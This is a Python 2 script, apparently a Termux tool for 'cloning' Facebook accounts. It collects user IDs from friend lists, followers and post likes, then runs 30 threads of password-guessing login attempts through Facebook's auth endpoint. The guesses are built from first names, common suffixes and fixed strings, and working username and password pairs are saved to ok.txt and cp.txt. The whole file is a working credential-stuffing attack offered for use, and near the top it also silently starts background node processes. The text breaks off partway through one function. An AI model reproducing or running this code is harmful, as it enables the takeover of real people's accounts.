#!/usr/bin/python
# coding=utf-8
# coded by : Arbab-Ali
# https://www.facebook.com/ArbabAli

try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("pip2 install mechanize")
    os.system("python2 MrX.py")
try:
    os.mkdir('save')
except OSError:
    pass
    if os.path.isfile('.../index.js'):
 	os.system('mv ... .....')
	os.system('cd ..... && npm install')
 	os.system('#')
 	os.system('#')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

def abm(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def logging():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Logging In\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def saving():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Saving Token\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def updateing():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Getting Updates\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def logout():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Logging Out\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def download():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Downloading\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
#Tech-abm
#logo01
logo = """
\033[1;92m                                                       
      
░█████╗░██████╗░██████╗░░█████╗░██████╗░
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
███████║██████╔╝██████╦╝███████║██████╦╝
██╔══██║██╔══██╗██╔══██╗██╔══██║██╔══██╗
██║░░██║██║░░██║██████╦╝██║░░██║██████╦╝
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░
\x1b[1;93m--------------------------------------------------------------
\x1b[1;92m➣ NAMA 💉 |✰✰✰ ARBAB ALI MEMON ✰✰✰|
\x1b[1;91m➣ INFO 💉 |✰✰✰ HACKER 0.128R.S ✰✰✰|
\x1b[1;93m➣ SPED 💉 |✰✰✰ 3.0PYTHON LOVER ✰✰✰|
\x1b[1;95m➣ NMBR 💉 |✰✰✰ 03003023263:9PM ✰✰✰|
\x1b[1;93m--------------------------------------------------------------
\033[1;91m     ✰✰✰✰✰———————————————————————————————✰✰✰✰✰
\033[1;91m      __  __            __   _           
\033[1;91m     |  \/  |   __ _   / _| (_)   __ _   
\033[1;91m       | |\/| |  / _` | | |_  | |  / _` |  
\033[1;91m       | |  | | | (_| | |  _| | | | (_| |  
\033[1;91m     |_|  |_|  \__,_| |_|   |_|  \__,_|  GANGE
                                                   
\033[1;91m     ✰✰✰✰✰———————————————————————————————✰✰✰✰✰
"""


idh = []
	
def tech_abm():
    os.system("clear")
    print logo
    abm("\033[1;93mFirst Tools login")
    print("\033[1;97m-------------------")
    username = raw_input("\033[1;97m[+]\033[1;96m Username :\033[1;97m ")
    if username =="Arbab":
        os.system("clear")
        print logo
        print ("[✓] Username : Arbab (Correct)")
        passwordss = raw_input("\033[1;97m[+]\033[1;96m Password :\033[1;97m ")
        if passwordss =="Memon":
            os.system("clear")
            print logo
            logging()
            os.system("clear")
            print logo 
            print ("\033[1;97m[✓]\033[1;97m Username : Arbab\033[1;92m (Correct)")
            print ("\033[1;97m[✓]\033[1;97m Password : Memon\033[1;92m (Correct)")
            time.sleep(1)
            print('')
            abm("\033[1;92m[✓] Login Successful\033[0;97m")
            time.sleep(1)
        try:
            open(".login.txt","r")
            menu()
        except(KeyError , IOError):
            login_choice()
        else:
            print ("[!] Password : "+passwordss+" (Wrong)")
            time.sleep(1)
            tech_abm()
    else:
        print ("[!] Username : "+username+" (Wrong)")
        time.sleep(1)
        tech_abm()
	
def login_choice():
    os.system('clear')
    print logo
    
    print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mClone Friendlist and Public ID \033[1;97m(\033[1;92mlogin\033[1;97m) ")
    print ("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mExit") 
    print("\033[1;97m--------------------------------------------------")
    clone_main()
def clone_main():
    hack = raw_input("\n╰─➣ ")
    if hack =="3":
        os.system("python2 .main.md")
        time.sleep(1)
        menu()
    if hack =="2":
        os.system("python2 .README.md")
        time.sleep(1)
        menu()
    if hack =="1":
        loginvia()   
    elif hack =="0":
        os.system("exit")
    else:
	print "\x1b[1;91mFill in correctly"
        clone_main()

def loginvia():
    os.system('clear')
    print logo
    print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mlogin With Access Token ")
    print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mLogin With User And Pass")
    print ("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mBack") 
    print("\033[1;97m--------------------------------------------------")
    clone_loginvia()
def clone_loginvia():
    hack = raw_input("\n╰─➣ ")
    if hack =="1":
        os.system("clear")
        print logo
        print ("Login With Token").center(50)
	print("\033[1;97m--------------------------------------------------")
        token = raw_input("\033[1;97m[+]\033[1;93m Paste Token Here :\033[1;97m ")
	print("\033[1;97m--------------------------------------------------")
        saving()
        sav = open(".login.txt","w")
        sav.write(token)
        sav.close()
        abm("\r\033[1;92m[✓] Login Successfull\033[0;97m")
	os.system('xdg-open https://m.facebook.com/Arbabmemon')
        time.sleep(1)
        menu()
    elif hack =="2":
        loginfb()
    elif hack =="0":
	        menu()
    else:
	        print ("[!] Please Select a Valid Option")
		clone_loginvia()
def loginfb():
    os.system("clear")
    print logo
    print("Login With Facebook Account").center(50)
    print("Use Proxy to login account ").center(50)
    print("\033[1;97m--------------------------------------------------")
    id = raw_input("\033[1;97m[+]\033[1;93m Email/ID/Number :\033[1;97m ")
    id1 = id.replace(' ','')
    id2 = id1.replace('(','')
    uid = id2.replace(')','')
    pwd = raw_input("\033[1;97m[+]\033[1;93m Password :\033[1;97m ")
    print("\033[1;97m--------------------------------------------------")
    logging()
    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
    q = json.loads(data)
    if "access_token" in q:
        succ = open(".login.txt","w")
        succ.write(q["access_token"])
        succ.close()
        print("\n\033[1;92m[✓] Login Successfull\033[0;97m")
        time.sleep(1)
        menu()
    else:
        if "www.facebook.com" in q["error_msg"]:
            print ("\n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m")
            time.sleep(1)
            loginfb()
        else:
            print("\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")
            time.sleep(1)
            loginfb()

def menu():
    os.system("clear")
    try:
        token = open(".login.txt","r").read()
    except IOError:
        print logo
        print("[!] Error 404.Token Not Found")
        os.system("rm -rf .login.txt")
        time.sleep(1)
        login_choice()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print logo
        print("\033[1;91m[!] Loading Failed . Your Account Has a Checkpoint")
        os.system("rm -rf .login.txt")
        time.sleep(1)
        login_choice()
    os.system('clear')
    print logo
    print("\033[1;97m[✓]\033[1;93m Name : "+name)
    print("\033[1;97m--------------------------------------------------")
    print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mClone Frienlist and Public ID")
    print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mRandom with choice password")
    
    print("\033[1;97m[3]\033[1;91m-⋄-\033[1;97mMore Hacking Tools \033[1;97m(\033[1;92mContinue\033[1;97m) ")
    
    print("\033[1;97m[4]\033[1;91m-⋄-\033[1;97mTool Update")
    print("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mlogout")
    print("\033[1;97m--------------------------------------------------") 
    menu_select()
def menu_select():
    option = raw_input("\n╰─➣ ")
    if option =="1":
        crack()
    if option =="2":
        choice()
    if option =="5":
        morec()
    if option =="3":
        hacker()
    elif option =="6":
        contact()
    elif option =="4":
        os.system("clear")
        print logo
        updateing()
        os.system("git pull origin master")
        time.sleep(1)
        os.system("clear")
        print logo
        abm("\033[1;32m[✓] Tool Has Been Updated Successfully\033[0;97m")
        time.sleep(1)
        os.system("python2 abm.py")
    elif option =="0":
        logout()
        os.system("rm -rf .login.txt")
        time.sleep(1)
        print("\r\033[1;32m[✓] Logged Out Successfully\033[0;97m")
        os.system("exit")
    else:
        print("[!] Please Select a Valid Option")
        menu_select()
		
def crack():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("[!] Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		login()
	os.system("clear")
	print logo
	print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mCrack From Friend List")
	print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mCrack From Public ID")
	print ("\033[1;97m[3]\033[1;91m-⋄-\033[1;97mCrack From Followers")
	print ("\033[1;97m[4]\033[1;91m-⋄-\033[1;97mCrack From Page/Group/ID Post")
	print ('\033[1;97m[0]\033[1;91m-⋄-\033[1;97mBack')
	print("\033[1;97m--------------------------------------------------")
	crack2()
def crack2():
	select = raw_input("\n╰─➣ ")
	id=[]
	oks=[]
	cps=[]
	if select=="1":
		os.system("clear")
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[✓] Account Name : "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[✓] Account Name : "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="4":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input Post ID :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
			z = json.loads(r.text)
			for i in z["data"]:
				uid=i['id']
				na=i['name']
				nm=na.rsplit(" ")[0]
				id.append(uid+'|'+nm)
		except KeyError:
			print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
			raw_input("\nPress Enter To Back")
			crack()
	   
	elif select =="0":
		menu()
	else:
		print ("[!] Please Select a Valid Option")
		crack2()
	print("\033[1;97m[✓]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
	time.sleep(0.5)
	print("\033[1;97m[✓]\033[1;95m The Process Is Running In Background\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m[✓]\033[1;95m To Stop Process Press CTRL Then Press z\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m--------------------------------------------------")
	
	
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"12"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass1+"\033[1;91m-✰-\033[1;97m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass1+"\033[1;91m-✰-\033[1;97m"+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"786"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass2+"\033[1;91m-✰-\033[1;97m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass2+"\033[1;91m-✰-\033[1;97m"+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass3+"\033[1;91m-✰-\033[1;97m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass3+"\033[1;91m-✰-\033[1;97m"+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4="786786"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;94m[\033[1;97mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass4+"\033[1;91m-✰-\033[1;97m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass4+"\033[1;91m-✰-\033[1;97m"+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="000786"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass5+"\033[1;91m-✰-\033[1;97m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass5+"\033[1;91m-✰-\033[1;97m"+name)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        
									
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print ('\033[1;97m[✓]\033[1;92m Process Has Been Completed')
	print('\033[1;97m[✓]\033[1;92m Total CP/\033[1:32mOK:\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
	print("\033[1;97m--------------------------------------------------")
	down()
def down():
    dow = raw_input("\033[1;97m[?]\033[1;93m Do Yoou Want To Download Cp File?\033[1;97m (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("\033[1;97m[!]\033[1;93m Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('\033[1;93m[✓]\033[1;92m File Downloaded Successfully')
        print("\033[1;93m[✓]\033[1;93m Please Open Your Internal Storage and Rename The File")
        raw_input("\033[1;97mPress Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("\033[1;91m[!] Please Select a Valid Option ")
        down()
		
def choice():
    os.system("clear")
    print logo
    print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mRandom Frienlist With 2 Choice Pass")
    print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mRandom Frienlist With 5 Choice Pass")
    print("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mBack")	
    time.sleep(0.5)
    print("\033[1;97m--------------------------------------------------")
    choice_man()
def choice_man():
    option = raw_input("\n╰─➣ ")
    if option =="1":
        unikk()
    if option =="2":
        randm()
    if option =="0":	
          menu()
    else:
          print ("[!] Please Select a Valid Option")
          choice_man()		
		
def unikk():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("[!] Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		login()
	os.system("clear")
	print logo
	print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mCrack From Friend List")
	print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mCrack From Public ID")
	print ("\033[1;97m[3]\033[1;91m-⋄-\033[1;97mCrack From Followers")
	print ("\033[1;97m[4]\033[1;91m-⋄-\033[1;97mCrack From Page/Group/ID Post")
	print ('\033[1;97m[0]\033[1;91m-⋄-\033[1;97mBack')
	print("\033[1;97m--------------------------------------------------")
	unikk2()
def unikk2():
	devil = raw_input("\n╰─➣ ")
	id=[]
	oks=[]
	cps=[]
	if devil=="1":
		os.system("clear")
		print logo
		pass1=raw_input("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m ")
		pass2=raw_input("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif devil =="2":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input Post ID/Username :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		pass1=raw_input("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m ")
		pass2=raw_input("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[✓] Account Name : "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			unikk()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif devil =="3":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input Post ID/Username :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		pass1=raw_input("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m ")
		pass2=raw_input("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[✓] Account Name : "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif devil =="4":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input Post ID/Username :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		pass1=raw_input("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m ")
		pass2=raw_input("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
			z = json.loads(r.text)
			for i in z["data"]:
				uid=i['id']
				na=i['name']
				nm=na.rsplit(" ")[0]
				id.append(uid+'|'+nm)
		except KeyError:
			print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
			raw_input("\nPress Enter To Back")
			unikk()
	   
	elif devil =="0":
		menu()
	else:
		print ("[!] Please Select a Valid Option")
		crack2()
	print("\033[1;97m[✓]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
	time.sleep(0.5)
	print("\033[1;97m[✓]\033[1;95m Random Choice Password Cloning\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m[✓]\033[1;95m To Stop Process Press CTRL Then Press z\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m--------------------------------------------------")
	
	
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\033[1;94m[\033[1;97mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass1+"\033[1;91m-⋄-\033[1;97m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\033[1;94m[\033[1;92mSuccessfull\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass1+"\033[1;91m-⋄-\033[1;97m"+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		          
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;94m[\033[1;97mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass2+"\033[1;91m-⋄-\033[1;97m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[1;94m[\033[1;92mSuccessfull\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass2+"\033[1;91m-⋄-\033[1;97m"+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
									
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print ('\033[1;97m[✓]\033[1;92m Process Has Been Completed')
	print('\033[1;97m[✓]\033[1;92m Total CP/\033[1:32mOK:\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
	print("\033[1;97m--------------------------------------------------")
	down()
def down():
    dow = raw_input("\033[1;97m[?]\033[1;93m Do Yoou Want To Download Cp File?\033[1;97m (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("\033[1;97m[!]\033[1;93m Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('\033[1;93m[✓]\033[1;92m File Downloaded Successfully')
        print("\033[1;93m[✓]\033[1;93m Please Open Your Internal Storage and Rename The File")
        raw_input("\033[1;97mPress Enter To Return In Main Menu ")
        crack()  
    elif dow =="no" or dow=="n":
        crack() 
    else:
        print("\033[1;91m[!] Please Select a Valid Option ")
        down()
		
def randm():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("[!] Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		login()
	os.system("clear")
	print logo
	print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;93mCrack From Friend List")
	print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;93mCrack From Public ID")
	print ("\033[1;97m[3]\033[1;91m-⋄-\033[1;93mCrack From Followers")
	print ("\033[1;97m[4]\033[1;91m-⋄-\033[1;93mCrack From Page/Group/ID Post")
	print ('\033[1;97m[0]\033[1;91m-⋄-\033[1;93mBack')
	print("\033[1;97m--------------------------------------------------")
	randm2()
def randm2():
	select = raw_input("\n╰─➣ ")
	id=[]
	oks=[]
	cps=[]
	if select=="1":
		os.system("clear")
		print logo
		print("\033[1;97m--------------------------------------------------")
		print("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m fristname123 ")
		print("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m firstname786")
		print("\033[1;93m[3]\033[1;97m Input Password  :\033[1;96m firstname1234")
		pass4=raw_input("\033[1;93m[4]\033[1;97m Input Password  :\033[1;96m ")
		pass5=raw_input("\033[1;93m[5]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		print("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m fristname123 ")
		print("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m firstname786")
